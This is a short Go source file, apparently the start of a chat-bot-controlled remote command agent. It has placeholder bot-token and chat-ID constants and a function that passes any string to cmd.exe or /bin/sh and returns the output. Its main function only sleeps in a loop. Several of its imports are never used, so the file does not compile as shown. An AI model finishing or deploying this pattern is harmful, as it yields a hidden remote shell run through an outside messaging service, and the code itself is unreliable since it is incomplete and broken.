package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"time"
)

const (
	Token  = "YOUR_BOT_TOKEN_HERE"
	ChatID = "YOUR_CHAT_ID_HERE"
)

func executeCommand(command string) string {
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd.exe", "/c", command)
	} else {
		cmd = exec.Command("/bin/sh", "-c", command)
	}
	output, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Sprintf("Error: %s\nOutput: %s", err.Error(), string(output))
	}
	return string(output)
}

func main() {
	for {
		time.Sleep(5 * time.Second)
	}
}
